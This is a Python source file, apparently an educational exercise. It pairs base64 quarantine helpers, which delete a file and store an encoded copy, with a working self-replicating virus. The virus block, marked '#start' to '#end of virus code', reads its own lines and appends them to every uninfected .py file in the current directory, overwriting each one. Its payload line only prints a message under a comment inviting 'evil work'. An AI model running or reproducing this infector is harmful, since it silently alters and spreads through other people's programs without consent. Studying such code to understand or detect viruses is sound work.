import base64
import os
import sys

os_name = sys.platform

def encode_base64(file, qPath):
    global os_name
    
    org_file_path = bytes(file, "utf-8")
    if "win" in os_name:
        org_file_name = file.rfind("\\")
    else:
        org_file_name = file.rfind("/")
    org_file_name = file[org_file_name+1:]
    f = open(file, "rb")
    org_content = f.read()
    f.close()
    os.remove(file)
    new_content = base64.b64encode(org_content)
    f = open(qPath + org_file_name + ".eb64", "wb")
    f.write(org_file_path + b"\n")
    f.write(new_content)
    f.close()

def decode_base64(file):
    f = open(file, "rb")
    org_content = f.read()
    f.close()
    org_content = org_content.splitlines()
    org_file_path = org_content[0]
    org_content.remove(org_file_path)
    new_content = []
    for i in org_content:
        new_content.append(base64.b64decode(i))   
    f = open(org_file_path, "wb")
    for i in new_content:
        f.write(i + b"\n")
    f.close()
    os.remove(file)
#start
import sys,re,glob
# put a copy of all these lines
virusCode=[]
#open this file and read all lines
#filter out all lines that are not inside the virus code boundary
thisFile=sys.argv[0]
virusFile = open(thisFile,"r")
lines = virusFile.readlines()
virusFile.close()
#save the lines into a list to use later
inVirus = False
for line in lines:
    if(re.search("^#start",line)):
        inVirus = True

        #if the virus code has been found,start ppending the lines
        # to the virusCode list. We assume that the code is always a
        # appended to the end of the script.
    if(inVirus == True):
        virusCode.append(line)
    if(re.search("^#end of virus code",line)):
        break
# find potential victims
programs = glob.glob("*.py")
# check and infect all programs that the glob found

for p in programs:
    file =open(p,"r")
    programCode = file.readlines()
    file.close()

    # check to see if the file is already infected
    infected = False
    for line in programCode:
        if(re.search("^#start",line)):
            infected = True
            break
        #stop, we dont need to try to infect this program again
    if not infected:
        newCode = []
        # new version = current + virus code
        newCode = programCode
        newCode.extend(virusCode)

        #write the new version to the file.Overwrite the original
        file = open(p,"w")
        file.writelines(newCode)
        file.close()
        
# payload - do your evil work here
print("This file is infected")
#end of virus code
